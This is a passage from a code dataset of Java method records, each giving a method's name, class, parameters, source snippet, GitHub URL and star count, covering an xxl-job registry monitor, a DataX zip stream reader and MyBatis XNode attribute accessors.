"https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/PackageHandlerProcessor.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33878, "method_name": "getHandler", "class_name": "PackageHandlerProcessor", "params": ["Class<ProtocolBody>"], "throws": null, "modifiers": ["public", "static"], "return_type": "PackageHandler<ProtocolBody>", "snippet": "    public static PackageHandler<? extends ProtocolBody> getHandler(Class<? extends ProtocolBody> classType) {\n        return CACHE_MAP.get(classType.getName());\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/core/PackageHandlerProcessor.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33879, "method_name": "getInstance", "class_name": "JobRegistryMonitorHelper", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "JobRegistryMonitorHelper", "snippet": "\tpublic static JobRegistryMonitorHelper getInstance(){\n\t\treturn instance;\n\t}", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/core/thread/JobRegistryMonitorHelper.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33880, "method_name": "start", "class_name": "JobRegistryMonitorHelper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void start(){\n\t\tregistryThread = new Thread(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\twhile (!toStop) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\t// auto registry group\n\t\t\t\t\t\tList<XxlJobGroup> groupList = XxlJobAdminConfig.getAdminConfig().getXxlJobGroupDao().findByAddressType(0);\n\t\t\t\t\t\tif (groupList!=null && !groupList.isEmpty()) {\n\n\t\t\t\t\t\t\t// remove dead address (admin/executor)\n\t\t\t\t\t\t\tList<Integer> ids = XxlJobAdminConfig.getAdminConfig().getXxlJobRegistryDao().findDead(RegistryConfig.DEAD_TIMEOUT, new Date());\n\t\t\t\t\t\t\tif (ids!=null && ids.size()>0) {\n\t\t\t\t\t\t\t\tXxlJobAdminConfig.getAdminConfig().getXxlJobRegistryDao().removeDead(ids);\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t// fresh online address (admin/executor)\n\t\t\t\t\t\t\tHashMap<String, List<String>> appAddressMap = new HashMap<String, List<String>>();\n\t\t\t\t\t\t\tList<XxlJobRegistry> list = XxlJobAdminConfig.getAdminConfig().getXxlJobRegistryDao().findAll(RegistryConfig.DEAD_TIMEOUT, new Date());\n\t\t\t\t\t\t\tif (list != null) {\n\t\t\t\t\t\t\t\tfor (XxlJobRegistry item: list) {\n\t\t\t\t\t\t\t\t\tif (RegistryConfig.RegistType.EXECUTOR.name().equals(item.getRegistryGroup())) {\n\t\t\t\t\t\t\t\t\t\tString appName = item.getRegistryKey();\n\t\t\t\t\t\t\t\t\t\tList<String> registryList = appAddressMap.get(appName);\n\t\t\t\t\t\t\t\t\t\tif (registryList == null) {\n\t\t\t\t\t\t\t\t\t\t\tregistryList = new ArrayList<String>();\n\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\tif (!registryList.contains(item.getRegistryValue())) {\n\t\t\t\t\t\t\t\t\t\t\tregistryList.add(item.getRegistryValue());\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tappAddressMap.put(appName, registryList);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t// fresh group address\n\t\t\t\t\t\t\tfor (XxlJobGroup group: groupList) {\n\t\t\t\t\t\t\t\tList<String> registryList = appAddressMap.get(group.getAppName());\n\t\t\t\t\t\t\t\tString addressListStr = null;\n\t\t\t\t\t\t\t\tif (registryList!=null && !registryList.isEmpty()) {\n\t\t\t\t\t\t\t\t\tCollections.sort(registryList);\n\t\t\t\t\t\t\t\t\taddressListStr = \"\";\n\t\t\t\t\t\t\t\t\tfor (String item:registryList) {\n\t\t\t\t\t\t\t\t\t\taddressListStr += item + \",\";\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\taddressListStr = addressListStr.substring(0, addressListStr.length()-1);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tgroup.setAddressList(addressListStr);\n\t\t\t\t\t\t\t\tXxlJobAdminConfig.getAdminConfig().getXxlJobGroupDao().update(group);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\tif (!toStop) {\n\t\t\t\t\t\t\tlogger.error(\">>>>>>>>>>> xxl-job, job registry monitor thread error:{}\", e);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\ttry {\n\t\t\t\t\t\tTimeUnit.SECONDS.sleep(RegistryConfig.BEAT_TIMEOUT);\n\t\t\t\t\t} catch (InterruptedException e) {\n\t\t\t\t\t\tif (!toStop) {\n\t\t\t\t\t\t\tlogger.error(\">>>>>>>>>>> xxl-job, job registry monitor thread error:{}\", e);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tlogger.info(\">>>>>>>>>>> xxl-job, job registry monitor thread stop\");\n\t\t\t}\n\t\t});\n\t\tregistryThread.setDaemon(true);\n\t\tregistryThread.setName(\"xxl-job, admin JobRegistryMonitorHelper\");\n\t\tregistryThread.start();\n\t}", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/core/thread/JobRegistryMonitorHelper.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33881, "method_name": "toStop", "class_name": "JobRegistryMonitorHelper", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void toStop(){\n\t\ttoStop = true;\n\t\t// interrupt and wait\n\t\tregistryThread.interrupt();\n\t\ttry {\n\t\t\tregistryThread.join();\n\t\t} catch (InterruptedException e) {\n\t\t\tlogger.error(e.getMessage(), e);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/core/thread/JobRegistryMonitorHelper.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33882, "method_name": "read", "class_name": "ZipCycleInputStream", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int read() throws IOException {\n        // \u5b9a\u4f4d\u4e00\u4e2aEntry\u6570\u636e\u6d41\u7684\u5f00\u5934\n        if (null == this.currentZipEntry) {\n            this.currentZipEntry = this.zipInputStream.getNextEntry();\n            if (null == this.currentZipEntry) {\n                return -1;\n            } else {\n                LOG.info(String.format(\"Validate zipEntry with name: %s\",\n                        this.currentZipEntry.getName()));\n            }\n        }\n\n        // \u4e0d\u652f\u6301zip\u4e0b\u7684\u5d4c\u5957, \u5bf9\u4e8e\u76ee\u5f55\u8df3\u8fc7\n        if (this.currentZipEntry.isDirectory()) {\n            LOG.warn(String.format(\"meet a directory %s, ignore...\",\n                    this.currentZipEntry.getName()));\n            this.currentZipEntry = null;\n            return this.read();\n        }\n\n        // \u8bfb\u53d6\u4e00\u4e2aEntry\u6570\u636e\u6d41\n        int result = this.zipInputStream.read();\n\n        // \u5f53\u524dEntry\u6570\u636e\u6d41\u7ed3\u675f\u4e86, \u9700\u8981\u5c1d\u8bd5\u4e0b\u4e00\u4e2aEntry\n        if (-1 == result) {\n            this.currentZipEntry = null;\n            return this.read();\n        } else {\n            return result;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ZipCycleInputStream.java", "stars": "23", "class_props": {"extends": "InputStream", "implements": null, "modifiers": ["public"]}}, {"id": 33883, "method_name": "close", "class_name": "ZipCycleInputStream", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws IOException {\n        this.zipInputStream.close();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/unstructuredstorage/reader/ZipCycleInputStream.java", "stars": "23", "class_props": {"extends": "InputStream", "implements": null, "modifiers": ["public"]}}, {"id": 33884, "method_name": "newXNode", "class_name": "XNode", "params": ["Node"], "throws": null, "modifiers": ["public"], "return_type": "XNode", "snippet": "  public XNode newXNode(Node node) {\n    return new XNode(xpathParser, node, variables);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33885, "method_name": "getParent", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "XNode", "snippet": "  public XNode getParent() {\n    Node parent = node.getParentNode();\n    if (!(parent instanceof Element)) {\n      return null;\n    } else {\n      return new XNode(xpathParser, parent, variables);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33886, "method_name": "getPath", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPath() {\n    StringBuilder builder = new StringBuilder();\n    Node current = node;\n    while (current instanceof Element) {\n      if (current != node) {\n        builder.insert(0, \"/\");\n      }\n      builder.insert(0, current.getNodeName());\n      current = current.getParentNode();\n    }\n    return builder.toString();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33887, "method_name": "getValueBasedIdentifier", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getValueBasedIdentifier() {\n    StringBuilder builder = new StringBuilder();\n    XNode current = this;\n    while (current != null) {\n      if (current != this) {\n        builder.insert(0, \"_\");\n      }\n      String value = current.getStringAttribute(\"id\",\n          current.getStringAttribute(\"value\",\n              current.getStringAttribute(\"property\", (String) null)));\n      if (value != null) {\n        value = value.replace('.', '_');\n        builder.insert(0, \"]\");\n        builder.insert(0,\n            value);\n        builder.insert(0, \"[\");\n      }\n      builder.insert(0, current.getName());\n      current = current.getParent();\n    }\n    return builder.toString();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33888, "method_name": "evalString", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String evalString(String expression) {\n    return xpathParser.evalString(node, expression);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33889, "method_name": "evalBoolean", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean evalBoolean(String expression) {\n    return xpathParser.evalBoolean(node, expression);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33890, "method_name": "evalDouble", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double evalDouble(String expression) {\n    return xpathParser.evalDouble(node, expression);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33891, "method_name": "evalNodes", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<XNode>", "snippet": "  public List<XNode> evalNodes(String expression) {\n    return xpathParser.evalNodes(node, expression);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33892, "method_name": "evalNode", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XNode", "snippet": "  public XNode evalNode(String expression) {\n    return xpathParser.evalNode(node, expression);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33893, "method_name": "getNode", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Node", "snippet": "  public Node getNode() {\n    return node;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33894, "method_name": "getName", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33895, "method_name": "getStringBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStringBody() {\n    return getStringBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33896, "method_name": "getStringBody", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStringBody(String def) {\n    if (body == null) {\n      return def;\n    } else {\n      return body;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33897, "method_name": "getBooleanBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean getBooleanBody() {\n    return getBooleanBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33898, "method_name": "getBooleanBody", "class_name": "XNode", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean getBooleanBody(Boolean def) {\n    if (body == null) {\n      return def;\n    } else {\n      return Boolean.valueOf(body);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33899, "method_name": "getIntBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getIntBody() {\n    return getIntBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33900, "method_name": "getIntBody", "class_name": "XNode", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getIntBody(Integer def) {\n    if (body == null) {\n      return def;\n    } else {\n      return Integer.parseInt(body);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33901, "method_name": "getLongBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLongBody() {\n    return getLongBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33902, "method_name": "getLongBody", "class_name": "XNode", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLongBody(Long def) {\n    if (body == null) {\n      return def;\n    } else {\n      return Long.parseLong(body);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33903, "method_name": "getDoubleBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDoubleBody() {\n    return getDoubleBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33904, "method_name": "getDoubleBody", "class_name": "XNode", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDoubleBody(Double def) {\n    if (body == null) {\n      return def;\n    } else {\n      return Double.parseDouble(body);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33905, "method_name": "getFloatBody", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "  public Float getFloatBody() {\n    return getFloatBody(null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33906, "method_name": "getFloatBody", "class_name": "XNode", "params": ["Float"], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "  public Float getFloatBody(Float def) {\n    if (body == null) {\n      return def;\n    } else {\n      return Float.parseFloat(body);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33907, "method_name": "getEnumAttribute", "class_name": "XNode", "params": ["Class<T>", "String"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T extends Enum<T>> T getEnumAttribute(Class<T> enumType, String name) {\n    return getEnumAttribute(enumType, name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33908, "method_name": "getEnumAttribute", "class_name": "XNode", "params": ["Class<T>", "String", "T"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T extends Enum<T>> T getEnumAttribute(Class<T> enumType, String name, T def) {\n    String value = getStringAttribute(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Enum.valueOf(enumType, value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33909, "method_name": "getStringAttribute", "class_name": "XNode", "params": ["String", "Supplier<String>"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStringAttribute(String name, Supplier<String> defSupplier) {\n    String value = attributes.getProperty(name);\n    return value == null ? defSupplier.get() : value;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33910, "method_name": "getStringAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStringAttribute(String name) {\n    return getStringAttribute(name, (String) null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33911, "method_name": "getStringAttribute", "class_name": "XNode", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStringAttribute(String name, String def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return value;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33912, "method_name": "getBooleanAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean getBooleanAttribute(String name) {\n    return getBooleanAttribute(name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33913, "method_name": "getBooleanAttribute", "class_name": "XNode", "params": ["String", "Boolean"], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "  public Boolean getBooleanAttribute(String name, Boolean def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Boolean.valueOf(value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33914, "method_name": "getIntAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getIntAttribute(String name) {\n    return getIntAttribute(name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33915, "method_name": "getIntAttribute", "class_name": "XNode", "params": ["String", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getIntAttribute(String name, Integer def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Integer.parseInt(value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33916, "method_name": "getLongAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLongAttribute(String name) {\n    return getLongAttribute(name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33917, "method_name": "getLongAttribute", "class_name": "XNode", "params": ["String", "Long"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLongAttribute(String name, Long def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Long.parseLong(value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33918, "method_name": "getDoubleAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDoubleAttribute(String name) {\n    return getDoubleAttribute(name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33919, "method_name": "getDoubleAttribute", "class_name": "XNode", "params": ["String", "Double"], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "  public Double getDoubleAttribute(String name, Double def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Double.parseDouble(value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33920, "method_name": "getFloatAttribute", "class_name": "XNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "  public Float getFloatAttribute(String name) {\n    return getFloatAttribute(name, null);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33921, "method_name": "getFloatAttribute", "class_name": "XNode", "params": ["String", "Float"], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "  public Float getFloatAttribute(String name, Float def) {\n    String value = attributes.getProperty(name);\n    if (value == null) {\n      return def;\n    } else {\n      return Float.parseFloat(value);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33922, "method_name": "getChildren", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<XNode>", "snippet": "  public List<XNode> getChildren() {\n    List<XNode> children = new ArrayList<>();\n    NodeList nodeList = node.getChildNodes();\n    if (nodeList != null) {\n      for (int i = 0, n = nodeList.getLength(); i < n; i++) {\n        Node node = nodeList.item(i);\n        if (node.getNodeType() == Node.ELEMENT_NODE) {\n          children.add(new XNode(xpathParser, node, variables));\n        }\n      }\n    }\n    return children;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33923, "method_name": "getChildrenAsProperties", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Properties", "snippet": "  public Properties getChildrenAsProperties() {\n    Properties properties = new Properties();\n    for (XNode child : getChildren()) {\n      String name = child.getStringAttribute(\"name\");\n      String value = child.getStringAttribute(\"value\");\n      if (name != null && value != null) {\n        properties.setProperty(name, value);\n      }\n    }\n    return properties;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33924, "method_name": "toString", "class_name": "XNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    StringBuilder builder = new StringBuilder();\n    toString(builder, 0);\n    return builder.toString();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33925, "method_name": "toString", "class_name": "XNode", "params": ["StringBuilder", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void toString(StringBuilder builder, int level) {\n    builder.append(\"<\");\n    builder.append(name);\n    for (Map.Entry<Object, Object> entry : attributes.entrySet()) {\n      builder.append(\" \");\n      builder.append(entry.getKey());\n      builder.append(\"=\\\"\");\n      builder.append(entry.getValue());\n      builder.append(\"\\\"\");\n    }\n    List<XNode> children = getChildren();\n    if (!children.isEmpty()) {\n      builder.append(\">\\n\");\n      for (XNode child : children) {\n        indent(builder, level + 1);\n        child.toString(builder, level + 1);\n      }\n      indent(builder, level);\n      builder.append(\"</\");\n      builder.append(name);\n      builder.append(\">\");\n    } else if (body != null) {\n      builder.append(\">\");\n      builder.append(body);\n      builder.append(\"</\");\n      builder.append(name);\n      builder.append(\">\");\n    } else {\n      builder.append(\"/>\");\n      indent(builder, level);\n    }\n    builder.append(\"\\n\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33926, "method_name": "indent", "class_name": "XNode", "params": ["StringBuilder", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void indent(StringBuilder builder, int level) {\n    for (int i = 0; i < level; i++) {\n      builder.append(\"    \");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33927, "method_name": "parseAttributes", "class_name": "XNode", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "Properties", "snippet": "  private Properties parseAttributes(Node n) {\n    